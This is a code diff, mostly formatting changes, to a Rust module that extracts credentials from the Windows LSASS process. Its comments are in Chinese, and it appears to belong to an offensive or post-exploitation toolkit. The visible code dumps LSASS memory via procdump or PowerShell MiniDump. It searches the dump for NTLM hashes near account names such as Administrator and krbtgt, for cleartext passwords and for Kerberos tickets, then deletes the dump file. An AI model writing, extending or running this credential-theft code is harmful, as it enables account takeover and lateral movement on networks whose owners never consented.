@@ -8,7 +8,7 @@
 //! 2. 直接读取LSASS进程内存
 //! 3. 使用Windows API（OpenProcess + MiniDumpWriteDump）
 
-use crate::cred::{Credential, CredType};
+use crate::cred::{CredType, Credential};
 
 /// 从LSASS进程提取凭据
 ///
@@ -41,17 +41,15 @@ pub fn extract_lsass_credentials() -> Result<Vec<Credential>, String> {
     // 方法2：尝试使用procdump
     if credentials.is_empty() {
         match dump_lsass_via_procdump() {
-            Ok(dump_path) => {
-                match parse_lsass_dump(&dump_path) {
-                    Ok(creds) => {
-                        credentials.extend(creds);
-                        let _ = std::fs::remove_file(&dump_path);
-                    }
-                    Err(e) => {
-                        tracing::warn!("[LSASS] procdump解析失败: {}", e);
-                    }
+            Ok(dump_path) => match parse_lsass_dump(&dump_path) {
+                Ok(creds) => {
+                    credentials.extend(creds);
+                    let _ = std::fs::remove_file(&dump_path);
                 }
-            }
+                Err(e) => {
+                    tracing::warn!("[LSASS] procdump解析失败: {}", e);
+                }
+            },
             Err(e) => {
                 tracing::debug!("[LSASS] procdump方法失败: {}", e);
             }
@@ -61,17 +59,15 @@ pub fn extract_lsass_credentials() -> Result<Vec<Credential>, String> {
     // 方法3：通过PowerShell直接调用MiniDump
     if credentials.is_empty() {
         match dump_lsass_via_powershell() {
-            Ok(dump_path) => {
-                match parse_lsass_dump(&dump_path) {
-                    Ok(creds) => {
-                        credentials.extend(creds);
-                        let _ = std::fs::remove_file(&dump_path);
-                    }
-                    Err(e) => {
-                        tracing::warn!("[LSASS] PowerShell dump解析失败: {}", e);
-                    }
+            Ok(dump_path) => match parse_lsass_dump(&dump_path) {
+                Ok(creds) => {
+                    credentials.extend(creds);
+                    let _ = std::fs::remove_file(&dump_path);
                 }
-            }
+                Err(e) => {
+                    tracing::warn!("[LSASS] PowerShell dump解析失败: {}", e);
+                }
+            },
             Err(e) => {
                 tracing::debug!("[LSASS] PowerShell方法失败: {}", e);
             }
@@ -214,8 +210,7 @@ fn parse_lsass_dump(dump_path: &str) -> Result<Vec<Credential>, String> {
     let mut credentials = Vec::new();
 
     // 读取dump文件
-    let dump_data = std::fs::read(dump_path)
-        .map_err(|e| format!("读取dump文件失败: {}", e))?;
+    let dump_data = std::fs::read(dump_path).map_err(|e| format!("读取dump文件失败: {}", e))?;
 
     tracing::info!("[LSASS] Dump文件大小: {} MB", dump_data.len() / 1024 / 1024);
 
@@ -232,7 +227,7 @@ fn parse_lsass_dump(dump_path: &str) -> Result<Vec<Credential>, String> {
             Credential::new(CredType::NtlmHash, "LSASS内存dump")
                 .with_username(&username)
                 .with_ntlm_hash(&ntlm_hash)
-                .with_attribute("extraction_method", "minidump_parse")
+                .with_attribute("extraction_method", "minidump_parse"),
         );
     }
 
@@ -241,14 +236,13 @@ fn parse_lsass_dump(dump_path: &str) -> Result<Vec<Credential>, String> {
     for (username, password) in cleartext_passwords {
         // 避免重复
         if !credentials.iter().any(|c: &Credential| {
-            c.password.as_deref() == Some(&password)
-                && c.username.as_deref() == Some(&username)
+            c.password.as_deref() == Some(&password) && c.username.as_deref() == Some(&username)
         }) {
             credentials.push(
                 Credential::new(CredType::CleartextPassword, "LSASS内存dump")
                     .with_username(&username)
                     .with_password(&password)
-                    .with_attribute("extraction_method", "minidump_parse")
+                    .with_attribute("extraction_method", "minidump_parse"),
             );
         }
     }
@@ -260,7 +254,7 @@ fn parse_lsass_dump(dump_path: &str) -> Result<Vec<Credential>, String> {
             Credential::new(CredType::KerberosTgt, "LSASS内存dump")
                 .with_username(&username)
                 .with_attribute("ticket_size", &ticket_data.len().to_string())
-                .with_attribute("extraction_method", "minidump_parse")
+                .with_attribute("extraction_method", "minidump_parse"),
         );
     }
 
@@ -275,18 +269,27 @@ fn find_ntlm_hashes(data: &[u8]) -> Vec<(String, String)> {
     // 用户名的UTF-16LE编码附近有32字节十六进制哈希
     // 常见用户名作为搜索锚点
     let common_usernames = [
-        "Administrator", "Guest", "DefaultAccount",
-        "krbtgt", "svc_", "admin", "user",
+        "Administrator",
+        "Guest",
+        "DefaultAccount",
+        "krbtgt",
+        "svc_",
+        "admin",
+        "user",
     ];
 
     for username in &common_usernames {
-        let user_utf16: Vec<u8> = username.encode_utf16()
+        let user_utf16: Vec<u8> = username
+            .encode_utf16()
             .flat_map(|c| c.to_le_bytes())
             .collect();
 
         // 在数据中搜索用户名
         let mut pos = 0;
-        while let Some(found_pos) = data[pos..].windows(user_utf16.len()).position(|w| w == user_utf16.as_slice()) {
+        while let Some(found_pos) = data[pos..]
+            .windows(user_utf16.len())
+            .position(|w| w == user_utf16.as_slice())
+        {
             let abs_pos = pos + found_pos;
 
             // 在用户名附近搜索32字符十六进制哈希
@@ -299,7 +302,7 @@ fn find_ntlm_hashes(data: &[u8]) -> Vec<(String, String)> {
                     &data[abs_pos..std::cmp::min(abs_pos + 256, data.len())]
                         .chunks(2)
                         .map(|c| u16::from_le_bytes([c[0], *c.get(1).unwrap_or(&0)]))
-                        .collect::<Vec<u16>>()
+                        .collect::<Vec<u16>>(),
                 );
                 let username_clean = user_str.split('\0').next().unwrap_or(username).to_string();
 
@@ -331,7 +334,10 @@ fn find_hex_string(data: &[u8], min_len: usize) -> Option<String> {
             if current_hex.len() >= min_len && current_hex.len() <= 64 {
                 // 有效的哈希长度
                 let candidate = current_hex.clone();
-                if best.as_ref().is_none_or(|b: &String| candidate.len() > b.len()) {
+                if best
+                    .as_ref()
+                    .is_none_or(|b: &String| candidate.len() > b.len())
+                {
                     best = Some(candidate);
                 }
             }
@@ -340,10 +346,14 @@ fn find_hex_string(data: &[u8], min_len: usize) -> Option<String> {
     }
 
     // 检查最后的序列
-    if current_hex.len() >= min_len && current_hex.len() <= 64
-        && best.as_ref().is_none_or(|b: &String| current_hex.len() > b.len()) {
-            best = Some(current_hex);
-        }
+    if current_hex.len() >= min_len
+        && current_hex.len() <= 64
+        && best
+            .as_ref()
+            .is_none_or(|b: &String| current_hex.len() > b.len())
+    {
+        best = Some(current_hex);
+    }
 
     best
 }
@@ -354,13 +364,21 @@ fn find_cleartext_passwords(data: &[u8]) -> Vec<(String, String)> {
 
     // 搜索常见密码前置字符串
     let password_markers: &[&[u8]] = &[
-        b"password", b"Password", b"PASSWORD",
-        b"passwd", b"pwd",
-        b"cleartext", b"clear-text",
+        b"password",
+        b"Password",
+        b"PASSWORD",
+        b"passwd",
+        b"pwd",
+        b"cleartext",
+        b"clear-text",
     ];
 
     for marker in password_markers {
-        for found in data.windows(marker.len()).enumerate().filter(|(_, w)| *w == *marker) {
+        for found in data
+            .windows(marker.len())
+            .enumerate()
+            .filter(|(_, w)| *w == *marker)
+        {
             let pos = found.0;
             let end = std::cmp::min(pos + 512, data.len());
             let surrounding = &data[pos..end];
@@ -375,12 +393,14 @@ fn find_cleartext_passwords(data: &[u8]) -> Vec<(String, String)> {
     }
 
     // 通用搜索：查找位于 "user" "login" "admin" 等词附近的ASCII/Unicode字符串
-    let context_markers: &[&[u8]] = &[
-        b"user", b"admin", b"login", b"credential", b"secret",
-    ];
+    let context_markers: &[&[u8]] = &[b"user", b"admin", b"login", b"credential", b"secret"];
 
     for marker in context_markers {
-        for found in data.windows(marker.len()).enumerate().filter(|(_, w)| *w == *marker) {
+        for found in data
+            .windows(marker.len())
+            .enumerate()
+            .filter(|(_, w)| *w == *marker)
+        {
             let pos = found.0;
             let search_range = pos.saturating_sub(1024);
             let search_end = std::cmp::min(pos + 1024, data.len());
@@ -395,10 +415,13 @@ fn find_cleartext_passwords(data: &[u8]) -> Vec<(String, String)> {
                         i += 1;
                     }
                     let candidate = String::from_utf8_lossy(&chunk[start..i]).to_string();
-                    if candidate.len() >= 6 && candidate.len() <= 64 && is_likely_password(&candidate)
-                        && !results.iter().any(|(_, p)| p == &candidate) {
-                            results.push(("(unknown)".to_string(), candidate));
-                        }
+                    if candidate.len() >= 6
+                        && candidate.len() <= 64
+                        && is_likely_password(&candidate)
+                        && !results.iter().any(|(_, p)| p == &candidate)
+                    {
+                        results.push(("(unknown)".to_string(), candidate));
+                    }
                 }
                 i += 1;
             }
@@ -443,7 +466,9 @@ fn is_likely_password(s: &str) -> bool {
     let has_upper = s.chars().any(|c| c.is_ascii_uppercase());
     let has_lower = s.chars().any(|c| c.is_ascii_lowercase());
     let has_digit = s.chars().any(|c| c.is_ascii_digit());
-    let has_special = s.chars().any(|c| "!@#$%^&*()_+-=[]{}|;:,.<>?/~`".contains(c));
+    let has_special = s
+        .chars()
+        .any(|c| "!@#$%^&*()_+-=[]{}|;:,.<>?/~`".contains(c));
 
     (has_upper || has_lower || has_digit) && (has_digit || has_special || len >= 8)
 }
@@ -493,6 +518,8 @@ fn find_kerberos_tickets(data: &[u8]) -> Vec<(String, Vec<u8>)> {
 
 #[cfg(test)]
 mod tests {
+    // 测试构造数据多为字段赋值模式，与进度条/默认值构建风格一致
+    #![allow(clippy::field_reassign_with_default)]
     use super::*;
 
     #[test]
@@ -530,7 +557,8 @@ mod tests {
     #[test]
     fn test_find_ntlm_hashes_basic() {
         let mut data = Vec::new();
-        let admin_utf16: Vec<u8> = "Administrator".encode_utf16()
+        let admin_utf16: Vec<u8> = "Administrator"
+            .encode_utf16()
             .flat_map(|c| c.to_le_bytes())
             .collect();
         data.extend_from_slice(&admin_utf16);
@@ -546,7 +574,7 @@ mod tests {
     #[test]
     fn test_get_lsass_pid_no_windows() {
         // 在非Windows系统上应该失败
-        let result = get_lsass_pid();
+        let _result = get_lsass_pid();
         // 可能是Ok或Err，取决于平台
     }
 }
